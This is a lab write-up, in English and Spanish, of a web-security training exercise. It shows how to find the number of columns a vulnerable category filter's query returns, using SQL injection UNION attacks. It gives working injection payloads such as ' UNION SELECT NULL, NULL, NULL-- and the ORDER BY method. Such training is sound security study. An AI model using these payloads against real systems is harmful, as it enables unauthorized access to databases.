---
title: "Lab: SQL injection UNION attack, determining the number of columns returned by the query"
date: 2025-11-03
category: "SQL Injection"
order: 4
tags: ["web-security-academy", "sql-injection", "lab", "union"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-union-number-of-columns.html
---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---

## Reglas de un UNION attack

- El número y el orden de las columnas debe ser el mismo en todas las consultas combinadas.
- Los tipos de datos deben ser compatibles entre columnas correspondientes.

## Dos formas de determinar el número de columnas

**Forma 1 — UNION SELECT con NULLs:**

```sql
SELECT ? FROM table1 UNION SELECT NULL
-- error → número incorrecto de columnas

SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL
-- 200 response code → número correcto de columnas
```

**Forma 2 — ORDER BY:**

```sql
SELECT a, b FROM table1 ORDER BY 3
```

---

## Pruebas realizadas

### Paso 1 — Confirmar la vulnerabilidad

Se prueba una comilla simple → el servidor tira un internal error, confirmando SQL injection.

### Paso 2 — Probar con un NULL

```sql
' UNION SELECT NULL--
```

No funciona — el número de columnas no coincide.

### Paso 3 — Probar con dos NULL

```sql
' UNION SELECT NULL, NULL--
```

Tampoco funciona — significa que tiene más columnas.

### Paso 4 — Probar con tres NULL ✅

```sql
' UNION SELECT NULL, NULL, NULL--
```

Devuelve `200 OK` — la tabla tiene 3 columnas. Lab resuelto.
